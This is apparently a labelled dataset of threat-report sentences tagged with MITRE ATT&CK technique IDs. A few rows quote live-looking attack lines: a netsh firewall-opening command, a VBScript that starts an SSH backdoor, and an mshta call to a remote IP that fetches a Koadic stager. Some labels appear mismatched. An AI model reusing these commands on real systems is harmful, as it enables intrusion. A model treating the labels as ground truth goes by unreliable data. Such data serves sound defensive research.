text1	labels
used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.	['T1071']
used legitimate programs such as AmmyAdmin and Team Viewer for remote interactive C2 to target systems.	['T1219']
used Microsoft’s Sysinternals tools to gather detailed information about remote systems.	['T1018']
used net use commands to connect to lateral systems within a network.	['T1021.002']
used spearphishing with Microsoft Office attachments to target victims.	['T1598.002']
used TCP port 80 for C2.	['T1043']
used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.	['T1003']
used various types of scripting to perform operations, including Python and batch scripts. The group was observed installing Python 2.7 on a victim.	['T1064']
uses a backdoor known as BADFLICK that is is capable of generating a reverse shell.	['T1059']
uses a command prompt to run a PowerShell script from Excel.	['T1059']
uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.	['T1071']
uses AES to encrypt C2 traffic.	['T1573']
uses an XOR 0x1 loop to encrypt its C2 domain.	['T1573']
uses basic obfuscation in the form of spaghetti code.	['T1027']
uses cmd.exe to execute netshcommands.	['T1059']
uses commonly used ports (like HTTPS/443) for command and control.	['T1043']
uses custom encryption for C2 using 3DES and RSA.	['T1573']
uses HTTP/HTTPS for command and control communication.	['T1071']
uses HTTP for command and control.	['T1071']
uses HTTP over port 443 for command and control.	['T1043']
uses macOS' .command file type to script actions.	['T1064']
uses multiple proxies to obfuscate network traffic from victims.	['T1090']
uses net.exe to connect to network shares using net use commands with compromised credentials.	['T1021.002']
uses PowerShell to execute various commands, one to execute its payload.	['T1059.001']
uses raw sockets to communicate with its C2 server.	['T1095']
uses RC4 to encrypt C2 responses.	['T1573']
uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.	['T1218.011']
uses tasklist /svc to display running tasks.	['T1007']
"uses the command cmd.exe /c netsh firewall add portopening TCP 443 ""adp"" and makes the victim machine function as a proxy server."	['T1090']
uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.	['T1027.002']
uses  to list TCP connection status.	['T1049']
uses  to perform remote service manipulation to execute a copy of itself as part of lateral movement.	['T1569.002']
uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived.	['T1114']
uses various XOR techniques to obfuscate its components.	['T1027']
uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.	['T1021.002']
uses WMI to perform process monitoring.	['T1047']
variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.	['T1218.010']
version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”	['T1071']
When it first starts,  spawns a new thread to log keystrokes.	['T1056']
When the  command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.	['T1001']
will delete files on the system.	['T1070.004']
will zip up the /Library/Keychains directory before exfiltrating it.	['T1560']
writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.	['T1486']
[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims	['T1189']
The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders	['T1059']
The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)	['T1059']
Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands	['T1059']
Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files	['T1059']
/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer	['T1059']
Traps provides endpoint protection, as it can block Excel from creating a command prompt process	['T1059']
Access remote objects interactively from the pupy shell and get auto-completion of remote attributes	['T1059']
It is used to create new processes, perform as a command line shell, and several other tasks	['T1059']
We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1	['T1059']
The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload	['T1027']
The code is obfuscated in order to hide any malicious activity on the remote server	['T1027']
This strangeness was related to values listed in newer BlackEnergy configuration files	['T1027']
These requests are encrypted using the RC4 algorithm	['T1027']
The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers	['T1027']
After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works	['T1027']
Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language	['T1027']
Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation	['T1027']
The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run	['T1027']
A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation	['T1027']
Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex	['T1027']
The C&C server then replies with the encrypted serialized configuration	['T1027']
The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor	['T1027']
Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way	['T1027']
The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.	['T1027']
"The ""Blackwater.bas"" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer."	['T1027']
Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.	['T1027']
Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post	['T1016']
By running SSH on the server in a compromised network, attackers can come back to the network whenever they want	['T1016']
Regular Expressions   ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(\\d+.\\d+.\\d+.\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers	['T1016']
DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network	['T1016']
RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation	['T1016']
Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings	['T1016']
(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address	['T1016']
Trickbot uses this encrypted module to scan the network and steal relevant network information.	['T1016']
The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)	['T1010']
Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others	['T1010']
LANS Deletes the file created by the LAN command to reverse the effect	['T1070.004']
USBS Deletes the file created by the USB command to reverse the effect	['T1070.004']
DEL Deletes a specified file	['T1070.004']
After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution	['T1070.004']
Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms	['T1070.004']
Both “%APPDATA%\\Microsoft\Windows\Cookies.txt” and “%APPDATA%\\Microsoft\Windows\Cookies.exe” are then deleted	['T1070.004']
Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.	['T1070.004']
OSinfo: OSInfo is a general purpose, system information gathering tool	['T1082']
infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information	['T1082']
"POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(""psX0DKYB0u...5TximyY+QY=""), ""u2RLhh+!LGd9p8!ZtuKcN"")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory"	['T1082']
This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)	['T1082']
The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim	['T1082']
Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers	['T1082']
This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017	['T1124']
The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC	['T1124']
Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)	['T1124']
The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT	['T1140']
This function is able to obfuscate code so that every iteration of the code is presented differently	['T1140']
The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left	['T1140']
"Here is the code:The goal of this code is to get information from the properties of the document (""Subject"", ""Company"", ""Category"", ""Hyperlink base"" and finally ""Comments"")"	['T1140']
The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\setup.cab   Encoded CAB file in the Word document	['T1140']
The most interesting part is the decrypted C&C configuration, as can be seen in the image below	['T1140']
Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle	['T1140']
To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers	['T1140']
The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”	['T1140']
The decrypted contents of the log file adhere to the format in Figure 22	['T1140']
Decrypted OwaAuth log file format	['T1140']
"""Are you Happy?"" campaign.""FreeMilk"" campaign.""North Korean Human Rights"" campaign.""Evil New Year 2018"" campaign.On January 2nd of 2018, the ""Evil New Year 2018"" was started"	['T1543', 'T1543.003']
Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target	['T1543', 'T1543.003']
HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules	['T1105']
The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path	['T1105']
The config file provides download instructions for the loader	['T1105']
Using this information, they can decide to explore further or instruct the compromised computer to download additional malware	['T1105']
Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful	['T1105']
Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable	['T1105']
Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system	['T1105']
2 Downloads a file to the system	['T1105']
This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word	['T1105']
When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)	['T1105']
Use of PowerShell to download additional tools	['T1105']
The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable	['T1105']
BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2	['T1071']
We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server	['T1071']
Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2	['T1071']
The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts	['T1071']
Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests	['T1071']
Later variants upload the file to a web server via an HTTP post command	['T1071']
All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests	['T1071']
To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server	['T1071']
For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request	['T1071']
If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling	['T1071']
The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file	['T1071']
We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection	['T1071']
XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system	['T1071']
For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL	['T1071']
The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443	['T1071']
In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\WINDOWS\TEMP\Dropbear\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789	['T1547.001']
"The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\""wscript.shell\"")objshell.run \""mshta hxxp://86.106.131.177:6500/zIZFh\"",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities"	['T1547.001']
NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence	['T1547.001']
This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified	['T1547.009']
This shortcut file points to the path of the previously written ‘winhelp.cpl’ file	['T1547.009']
It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”	['T1132']
This encoded information then gets an additional header added and sent across the network.	['T1132']
Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails	['T1598.002']
Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158	['T1598.002']
Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations	['T1598.002']
MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros	['T1598.002']
The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”	['T1598.002']
The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page	['T1598.002']
The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document	['T1204']
These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (2).exeC:\Users\ADMINI~1\AppData\Local\Temp\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process	['T1204']
Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware	['T1204']
Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.	['T1204']
The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN	['T1553.002']
The DLL is also digitally signed by a certificate from “AirVPN”	['T1553.002']
If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages	['T1573']
Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm	['T1573']
The AES key is unique for each communication and is encrypted with one of two RSA public keys	['T1573']
One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server	['T1102']
The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'	['T1003']
The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group	['T1003']
The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz	['T1003']
In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017	['T1003']
We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid	['T1003']
Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer	['T1003']
Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems	['T1003']
DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices	['T1083']
Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type	['T1083']
The dropped files are either in the root of the “ProgramData” folder or in a subdirectory	['T1083']
Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle	['T1083']
.iqy files are simple text files containing a URL which are opened by default by Excel	['T1083']
These platforms may not be well maintained and may break intermittently	['T1083']
Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use	['T1083']
Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild	['T1203']
Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document	['T1203']
Attack chain of Tropic Trooper’s operations Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)	['T1203']
The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.	['T1203']
The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113	['T1068']
Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware	['T1518.001']
This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques	['T1518.001']
Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment	['T1518.001']
Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint	['T1518.001']
[9] “HKU concern group raises proxy fears in key vote.” EIJ Insight	['T1090']
In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment	['T1021.001']
APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration	['T1560']
The results are Gzipped and saved under random file in the temp folder.	['T1560']
TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords	['T1110']
This version injects a malicious module into one of Avast's processes, whereas early versions of the campaign detected Avast and quit	['T1055']
Injects ma32.dll into “wwahost.exe” or “audacity.exe”	['T1055']
FakeRun’s PDB string (D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process	['T1055']
20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer	['T1055']
The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command	['T1055']
After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.	['T1055']
Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information	['T1047']
Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding	['T1047']
This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query	['T1047']
Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality	['T1047']
FeedBack.php validates the sender by User-Agent, saves the data in the “RAR” server directory and stores the metadata in the mssql database for later reference	['T1074']
On the next step this file is executed by rundll32.exe via the KlpSvc export	['T1218.011']
19-1 regsvr32 running the .dlls  Fig	['T1218.010']
It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind	['T1027.002']
An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed	['T1027.002']
Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX	['T1027.002']
Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes	['T1027.002']
This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat	['T1036']
CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset	['T1036']
Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity	['T1036']
Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement	['T1021.002']
There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field	['T1033']
Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables	['T1033']
These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions	['T1033']
When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell	['T1033']
Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers	['T1059', 'T1064']
When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode	['T1059', 'T1064']
Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcode injection with native x86 shellcode”	['T1059', 'T1064']
However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware	['T1059', 'T1064']
The full contents of the batch script are given in Appendix C – a.bat	['T1059', 'T1064']
Can capture all screen (“AllScreen”) or the active window (“ActiveWindow”)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration	['T1113']
The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences	['T1113']
The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system	['T1113']
It also deletes Windows Event Logs : Application, Security, Setup, System	['T1070']
As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister	['T1056']
Example of decoded keylogger output	['T1056']
